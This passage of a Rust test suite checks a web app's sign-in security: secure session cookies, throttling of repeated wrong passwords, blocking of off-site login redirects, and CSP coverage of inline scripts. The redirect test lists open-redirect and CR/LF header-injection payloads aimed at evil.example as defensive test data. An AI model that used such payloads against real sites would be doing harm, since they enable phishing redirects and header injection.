        let cookies: Vec<&str> = response.headers().get_all(header::SET_COOKIE).iter().map(|v| v.to_str().unwrap()).collect();
        assert!(cookies.iter().any(|c| c.starts_with("__Host-nn_session=") && c.contains("; Secure")), "{cookies:?}");
    }

    #[tokio::test]
    async fn repeated_wrong_passwords_are_throttled() {
        let app = with_password("hunter2").await;
        for _ in 0..5 {
            let response = app.send(sign_in("nope", "192.0.2.7")).await;
            assert_eq!(response.status(), StatusCode::SEE_OTHER);
            assert!(response.headers()[header::LOCATION].to_str().unwrap().starts_with("/login?error=1"));
        }
        let response = app.send(sign_in("hunter2", "192.0.2.7")).await;
        assert_eq!(response.status(), StatusCode::TOO_MANY_REQUESTS);
        assert!(response.headers().get(header::SET_COOKIE).is_none());
        assert!(response.headers().contains_key(header::RETRY_AFTER));
        let body = String::from_utf8(
            http_body_util::BodyExt::collect(response.into_body()).await.unwrap().to_bytes().to_vec(),
        )
        .unwrap();
        assert!(body.contains("Too many failed sign-in attempts"), "{body}");
        // Someone else can still sign in.
        let response = app.send(sign_in("hunter2", "192.0.2.8")).await;
        assert_eq!(response.status(), StatusCode::SEE_OTHER);
        assert!(response.headers().contains_key(header::SET_COOKIE));
    }

    /// `next` can never send the browser to another site, whatever bytes it
    /// smuggles (browsers drop tab, CR and LF and read `\\` as `/`), and odd
    /// bytes never crash the handler.
    #[tokio::test]
    async fn login_next_cannot_leave_the_site() {
        let app = TestApp::new().await; // no password: `/login` redirects at once
        for (next, expected) in [
            ("/%09/evil.example", "/notebooks"),
            ("/%5Cevil.example", "/notebooks"),
            ("%2F%2Fevil.example", "/notebooks"),
            ("//evil.example", "/notebooks"),
            ("/%5C%5Cevil.example", "/notebooks"),
            ("/a%5Cb", "/notebooks"),
            ("/%0D%0ALocation:%20https://evil.example", "/notebooks"),
            ("/%0Aevil", "/notebooks"),
            ("/%0D", "/notebooks"),
            ("/%7F/evil.example", "/notebooks"),
            ("https://evil.example", "/notebooks"),
            ("/notebooks/x%3Fy%3D1%23z", "/notebooks/x?y=1#z"),
            ("/sources", "/sources"),
        ] {
            let response = app.send(Request::builder().uri(format!("/login?next={next}")).body(Body::empty()).unwrap()).await;
            assert_eq!(response.status(), StatusCode::SEE_OTHER, "{next}");
            assert_eq!(response.headers()[header::LOCATION], expected, "{next}");
        }
    }

    /// Every inline `<script>` a page renders must be allowed by the page CSP,
    /// or the browser silently skips it. Catches a script edited (or added)
    /// without going through `INLINE_SCRIPTS`.
    #[tokio::test]
    async fn the_page_csp_allows_every_inline_script_it_renders() {
        let app = TestApp::new().await;
        let (_, nb) = app.post("/api/notebooks", serde_json::json!({ "name": "CSP", "description": "" })).await;
        let nb_path = format!("/notebooks/{}", auth::encode_query_value(nb["id"].as_str().unwrap()));
        let inline = regex::Regex::new(r"(?s)<script>(.*?)</script>").unwrap();
        let mut seen = std::collections::HashSet::new();
        for path in ["/notebooks", "/notes", nb_path.as_str(), "/no/such/page", "/sources", "/search"] {
            let response = app.send(Request::builder().uri(path).body(Body::empty()).unwrap()).await;
            let csp = response.headers()[header::CONTENT_SECURITY_POLICY].to_str().unwrap().to_string();
            let body = String::from_utf8(
                http_body_util::BodyExt::collect(response.into_body()).await.unwrap().to_bytes().to_vec(),
            )
            .unwrap();
            for script in inline.captures_iter(&body) {
                let hash = crate::api::perimeter::script_hash(&script[1]);
                assert!(csp.contains(&hash), "{path}: inline script not allowed by the CSP: {}", &script[1]);
                seen.insert(script[1].to_string());
            }
        }
        for script in INLINE_SCRIPTS {
            assert!(seen.contains(script), "never rendered: {script}");
        }
    }
}
